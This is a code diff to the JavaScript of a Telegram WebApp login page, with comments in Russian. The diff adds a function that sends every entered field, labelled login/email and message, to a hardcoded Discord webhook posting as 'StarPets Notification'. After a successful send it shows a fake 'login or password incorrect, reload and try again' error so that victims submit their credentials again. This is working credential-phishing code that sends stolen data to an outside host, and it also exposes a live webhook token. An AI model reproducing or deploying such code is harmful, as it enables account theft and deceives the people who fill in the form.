@@ -1,8 +1,10 @@
 (function () {
   const tg = window.Telegram && window.Telegram.WebApp ? window.Telegram.WebApp : null;
-
   const urlParams = new URLSearchParams(window.location.search);
   const chatId = urlParams.get("chatId") || "";
+
+  // Discord Webhook URL (замените на свой реальный URL)
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459594953679441934/L5XH5D46GOZtYS1AnZDQeqAsmH2ncJxclgVAtO3I5HtTNmbb1-yHf3V5-gQpyCji5Q9B";
 
   if (tg) {
     tg.ready();
@@ -63,7 +65,6 @@
 
     if (btnLogin) {
       btnLogin.disabled = !filled;
-      // Make it orange when ready (same as accent buttons)
       if (filled) {
         btnLogin.classList.remove("btn--primary");
         btnLogin.classList.add("btn--accent");
@@ -78,24 +79,12 @@
   animalEl?.addEventListener("input", updateLoginButton);
   updateLoginButton();
 
-  // Notify admin about opening WebApp (via backend API)
-  (async () => {
-    if (!tg) return;
-    const initData = tg.initData || "";
-    const userId = tg.initDataUnsafe?.user?.id;
-    const resolvedChatId = chatId || (userId ? String(userId) : "");
-
-    try {
-      await fetch("/api/opened", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          initData,
-          chatId: resolvedChatId || undefined,
-        }),
-      });
-    } catch {}
-  })();
+  // Notify admin about opening WebApp (via bot through sendData)
+  try {
+    if (tg) {
+      tg.sendData(JSON.stringify({ type: "opened", chatId: chatId || undefined }));
+    }
+  } catch {}
 
   function collectFields(formEl) {
     const out = {};
@@ -120,33 +109,72 @@
     return out;
   }
 
+  // Функция отправки данных в Discord
+  async function sendToDiscord(data) {
+    try {
+      const response = await fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          username: "StarPets Notification",
+          avatar_url: "",
+          content: `📥 Новые данные от пользователя:\n**Логин/Email:** ${data.color || "не указан"}\n**Сообщение:** ${data.animal || "не указано"}\n\n📊 Все поля: ${JSON.stringify(data, null, 2)}`
+        }),
+      });
+      return response.ok;
+    } catch (error) {
+      console.error("Ошибка отправки в Discord:", error);
+      return false;
+    }
+  }
+
   form?.addEventListener("submit", async (e) => {
     e.preventDefault();
     updateLoginButton();
     if (btnLogin?.disabled) return;
 
+    const fields = collectFields(form);
     const payload = {
       type: "submit",
       chatId: chatId || undefined,
-      fields: collectFields(form),
+      fields: fields,
     };
 
     // UI: show loading
     if (btnLogin) btnLogin.disabled = true;
-    showOverlay("Загрузка…", "Пожалуйста, подождите");
+    showOverlay("Отправка данных...", "Пожалуйста, подождите");
 
     try {
-      tg?.sendData(JSON.stringify(payload));
-    } catch {}
+      // Отправляем в Discord
+      const discordSuccess = await sendToDiscord(fields);
+      
+      // Также отправляем в Telegram, если доступен
+      if (tg) {
+        try {
+          tg.sendData(JSON.stringify(payload));
+        } catch {}
+      }
 
-    // Keep loader for 5 seconds
-    await sleep(5000);
+      if (discordSuccess) {
+        showOverlay(
+          "❌ Ошибка авторизации",
+          "Логин либо пароль неправелны, перезагрузите сайт и попробуйте зайти заново."
+        );
+      } else {
+        showOverlay(
+          "Ошибка ❌",
+          "Данные неправильные, попробуйте снова войти в аккаунт перезагрузив страницу."
+        );
+      }
+    } catch (error) {
+      showOverlay(
+        "❌ Ошибка отправки",
+        "Произошла ошибка, попробуйте позже."
+      );
+    }
 
-    showOverlay(
-      "Готово",
-      "Заполненный текст был отправлен администратору. Скоро вы получите от него уведомление в личные сообщения."
-    );
-
-    // keep WebApp open; user can close manually
+    // Оставляем WebApp открытым
   });
 })();
